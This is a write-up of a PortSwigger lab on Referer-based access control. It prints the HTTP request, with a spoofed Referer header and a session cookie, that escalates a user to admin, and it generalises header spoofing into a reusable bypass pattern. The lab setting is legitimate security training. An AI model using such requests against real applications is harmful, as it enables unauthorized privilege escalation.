# Challenge Name: Referer-based access control 
# Platform: PortSwigger
# Difficulty: Practitioner

## 1. Vulnerability Type
Broken Access Control - Vertical Privilege Escalation

## 2. Root Cause
Application relies on the Referer header for access control,
but does not properly validate user authorization server-side.
## 3. Attack Surface
`/admin-roles`

## 4. Exploit Method
After careful inspection of admin-side requests, it is possible to see `Referer` header in most of them. To exploit it, we use `wiener:peter` account to check if server checks authorization for `Referer` header, which it does not.
Therefore, a request like this will work for unauthorized users:
```bash
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0af1009303b41078823648a1008a0074.web-security-academy.net
Cookie: session=oBDitEw5TZ0oiVC2OzzM19h8m4IxgVT7
Referer: https://0af1009303b41078823648a1008a0074.web-security-academy.net/admin
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
...
```
The server trusts the Referer header to determine whether the request
originates from the admin panel, so an attacker can spoof the header
to bypass access control.
## 5. Payload / Technique
Request modification
```bash
GET /admin-roles?username=wiener&action=upgrade HTTP/2
```
```bash
Referer: https://0af1009303b41078823648a1008a0074.web-security-academy.net/admin
```
These are the payloads in the request to get vertical privilege escalation.
## 6. Impact
Unauthorized users can get access to sensitive admin actions such is upgrade/downgrade role to admin/user. This can also lead to potential data leak, data loss and possible full administrative control over web app.

## 7. Reusable Pattern
If access control depends on headers such as Referer,
try modifying or spoofing them to bypass authorization checks.
## 8. Key Takeaway
Always validate requests server-side: check authorization and ownership before moving request forward. Preventing unauthorized access is one of the most important security features.


